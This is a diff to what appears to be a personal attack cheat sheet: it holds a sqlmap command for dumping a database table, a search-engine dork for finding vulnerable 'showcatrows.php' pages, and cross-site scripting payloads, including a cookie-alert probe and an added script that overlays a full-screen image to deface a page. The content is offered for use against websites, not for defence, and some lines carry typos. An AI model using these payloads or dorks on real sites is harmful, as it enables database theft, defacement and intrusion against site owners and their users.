@@ -34,6 +34,7 @@ sqlmap -u URL -D @@ -T user_sites --cloumns
 xss : cross site scripting
 
 Dork :
+
 inurl:"/showcatrows.php?CategoryID="
 
 "><marquee><h1>??????</h1></mmarque
@@ -61,6 +62,18 @@ exploit :
 ()&%<acx><ScRiPt >alert("XSS")</ScRiPt>
 
 "><script>alert(document.cookie)</script>
+
+<script>
+  var img = new Image();
+  img.src = "https://example.com/your-gif-file.gif";
+  img.style.position = "fixed";
+  img.style.left = "0";
+  img.style.top = "0";
+  img.style.width = "100%";
+  img.style.height = "100%";
+  img.style.zIndex = "9999";
+  document.body.appendChild(img);
+</script>
 
 <script>document.body.innerHTML=" <img src='SITE THAT HAVE YOUT IMG' >"</script>
 
